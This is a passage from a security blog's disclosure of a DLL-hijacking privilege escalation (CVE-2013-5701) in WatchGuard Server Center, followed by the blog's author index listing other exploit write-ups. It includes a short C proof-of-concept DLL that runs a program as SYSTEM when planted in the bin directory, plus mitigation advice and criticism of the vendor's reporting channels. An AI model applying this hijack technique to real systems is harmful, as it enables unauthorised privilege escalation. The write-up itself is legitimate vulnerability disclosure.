[![CVE-2013-5701-3](/wp-content/uploads/2022/10/CVE-2013-5701-3.png)](/wp-content/uploads/2022/10/CVE-2013-5701-3.png)

Now that we know the name of at least one function from the wgpr.dll, we are able to create our own arbitrary library:

```
#include

#define DLL_EXPORT __declspec(dllexport)

#ifdef __cplusplus
extern "C"
{
#endif

void DLL_EXPORT wgpr_library_get()
{
    WinExec("calc",0);
}

#ifdef __cplusplus
}
#endif

```

This code snippet simply creates the ‚Äúwgpr\_library\_get‚Äù export and its only task is to launch calc.exe ‚Äì as SYSTEM :-). Copying this library to the bin directory allows executing of everything you may imagine ‚Äì and can be semi-automated using Metasploit.

### Any limitations and/or mitigations?

Not all installations of the Server Center are vulnerable ‚Äì this highly depends on the directory where the administrator installed the software:

* On a default installation (%programfiles%\Watchguard) of the Watchguard Server¬†Center on Windows Vista and above the directory permissions disallow an¬†low-privileged attacker to mount the attack.
* On a default installation (%programfiles%\Watchguard) of the Watchguard Server¬†Center on Windows XP, the attacker needs to have at least Power User rights to¬†successfully mount the attack.
* On a non-default installation of the Watchguard Server Center to a directory,¬†which is writeable by a low-privileged user, the attack can be mounted successfully¬†without any restrictions

The logical conclusion: To make sure this vulnerability isn‚Äôt used in a privileges escalation scenario, you only need to harden the directory permissions to make it impossible for low-privileged users to write own files into the bin/ directory.

### Some last words (criticism) about the disclosure ‚Äì process.

The disclosure process started like with every other advisory, I‚Äôve coordinated: You‚Äôre looking for some way of contacting the vendor. But what if the vendor does not provide a useful address ? Contacting using some info@ or POST-forms is most of the time useless, because they are (but ony if they are) read by the wrong people.

Watchguard in this case did not provide a dedicated address to report security vulnerabilities. No support@, no security@ addresses were available, which results in missing RFC2142, although they assure that they are closely working with 3rd party security researchers.

Fine, but how did those ‚Äúsecurity researchers‚Äù report their issues ? Well ‚Äì thanks to myself ‚Äì they have a security mail address including a gpg key from now on üôÇ

Finally‚Ä¶now just think about the fact that we‚Äôre talking about a security vendor here.

* [X](https://twitter.com/MrTuxracer)
* [RSS](https://www.rcesecurity.com/feed/)

Designed by [Elegant Themes](https://www.elegantthemes.com "Premium WordPress Themes") | Powered by [WordPress](https://www.wordpress.org)



=== Content from www.rcesecurity.com_b05695bb_20250126_102131.html ===


[![RCE Security](https://www.rcesecurity.com/wp-content/uploads/2024/03/logo_small.png)](https://www.rcesecurity.com/)

* [Home](https://www.rcesecurity.com/)
* [About](https://www.rcesecurity.com/about/)
* [Services](https://www.rcesecurity.com/consulting-services/)
* [Research](https://www.rcesecurity.com/blog/)
* [Contact Us](https://www.rcesecurity.com/contact/)

Select Page

[![WordPress GiveWP POP to RCE (CVE-2024-5932)](https://www.rcesecurity.com/wp-content/uploads/2024/08/cve-2024-5932-0.png)](https://www.rcesecurity.com/2024/08/wordpress-givewp-pop-to-rce-cve-2024-5932/)
## [WordPress GiveWP POP to RCE (CVE-2024-5932)](https://www.rcesecurity.com/2024/08/wordpress-givewp-pop-to-rce-cve-2024-5932/)

by [Julien Ahrens](https://www.rcesecurity.com/author/mrtux/ "Posts by Julien Ahrens") | Monday, August 26, 2024 | [Bug Bounty](https://www.rcesecurity.com/category/bug-bounty/), [CVE](https://www.rcesecurity.com/category/cve/), [Exploit](https://www.rcesecurity.com/category/exploit/)

A few days ago, Wordfence published a blog post about a PHP Object Injection vulnerability affecting the popular WordPress Plugin GiveWP in all versions <= 3.14.1. Since the blog post contains only information about (a part) of the POP chain used, I decided to take a look and build a fully functional Remote Code Execution exploit. This post describes how I approached the process, identifying the missing parts and building the entire POP chain.

[![Patch Diffing CVE-2023-28121 to Compromise a WooCommerce](https://www.rcesecurity.com/wp-content/uploads/2023/07/woocommerce-payments-auth-bypass-4.png)](https://www.rcesecurity.com/2023/07/patch-diffing-cve-2023-28121-to-compromise-a-woocommerce/)
## [Patch Diffing CVE-2023-28121 to Compromise a WooCommerce](https://www.rcesecurity.com/2023/07/patch-diffing-cve-2023-28121-to-compromise-a-woocommerce/)

by [Julien Ahrens](https://www.rcesecurity.com/author/mrtux/ "Posts by Julien Ahrens") | Monday, July 3, 2023 | [Exploit](https://www.rcesecurity.com/category/exploit/), [Patch Diffing](https://www.rcesecurity.com/category/patch-diffing/)

Back in March 2023, I noticed an interesting security advisory that was published by Wordfence about a critical ‚ÄúAuthentication Bypass and Privilege Escalation‚Äù (aka CVE-2023-28121) affecting the ‚ÄúWooCommerce Payments‚Äù plugin which has more...

[![SecurePwn Part 2: Leaking Remote Memory Contents (CVE-2023-22897)](https://www.rcesecurity.com/wp-content/uploads/2023/04/securepwn-10.png)](https://www.rcesecurity.com/2023/04/securepwn-part-2-leaking-remote-memory-contents-cve-2023-22897/)
## [SecurePwn Part 2: Leaking Remote Memory Contents (CVE-2023-22897)](https://www.rcesecurity.com/2023/04/securepwn-part-2-leaking-remote-memory-contents-cve-2023-22897/)

by [Julien Ahrens](https://www.rcesecurity.com/author/mrtux/ "Posts by Julien Ahrens") | Wednesday, April 12, 2023 | [Advisory](https://www.rcesecurity.com/category/advisory/), [CVE](https://www.rcesecurity.com/category/cve/), [Exploit](https://www.rcesecurity.com/category/exploit/)

While my last finding affecting SecurePoint‚Äôs UTM was quite interesting already, I was hit by a really hard OpenSSL Heartbleed flashback with this one. The following exploit works against both the admin portal on port 11115 as well as the user portal on port...

[![SecurePwn Part 1: Bypassing SecurePoint UTM‚Äôs Authentication (CVE-2023-22620)](https://www.rcesecurity.com/wp-content/uploads/2023/01/securepwn-1.png)](https://www.rcesecurity.com/2023/04/securepwn-part-1-bypassing-securepoint-utms-authentication-cve-2023-22620/)
## [SecurePwn Part 1: Bypassing SecurePoint UTM‚Äôs Authentication (CVE-2023-22620)](https://www.rcesecurity.com/2023/04/securepwn-part-1-bypassing-securepoint-utms-authentication-cve-2023-22620/)

by [Julien Ahrens](https://www.rcesecurity.com/author/mrtux/ "Posts by Julien Ahrens") | Tuesday, April 11, 2023 | [Advisory](https://www.rcesecurity.com/category/advisory/), [CVE](https://www.rcesecurity.com/category/cve/), [Exploit](https://www.rcesecurity.com/category/exploit/)

While working on a recent customer engagement, I discovered two fascinating and somewhat weird bugs in SecurePoint‚Äôs UTM firewall solution. The first one, aka CVE-2023-22620, is rated critical for an attacker to bypass the entire authentication and gain access...

[![From Zero to Hero Part 2: From SQL Injection to RCE on Intel DCM (CVE-2022-21225)](https://www.rcesecurity.com/wp-content/uploads/2022/12/dcm-sqli-9.png)](https://www.rcesecurity.com/2022/12/from-zero-to-hero-part-2-intel-dcm-sql-injection-to-rce-cve-2022-21225/)
## [From Zero to Hero Part 2: From SQL Injection to RCE on Intel DCM (CVE-2022-21225)](https://www.rcesecurity.com/2022/12/from-zero-to-hero-part-2-intel-dcm-sql-injection-to-rce-cve-2022-21225/)

by [Julien Ahrens](https://www.rcesecurity.com/author/mrtux/ "Posts by Julien Ahrens") | Thursday, December 1, 2022 | [Advisory](https://www.rcesecurity.com/category/advisory/), [Bug Bounty](https://www.rcesecurity.com/category/bug-bounty/), [CVE](https://www.rcesecurity.com/category/cve/)

[¬´ Older Entries](https://www.rcesecurity.com/author/mrtux/page/2/)

* [X](https://twitter.com/MrTuxracer)
* [RSS](https://www.rcesecurity.com/feed/)

Designed by [Elegant Themes](https://www.elegantthemes.com "Premium WordPress Themes") | Powered by [WordPress](https://www.wordpress.org)


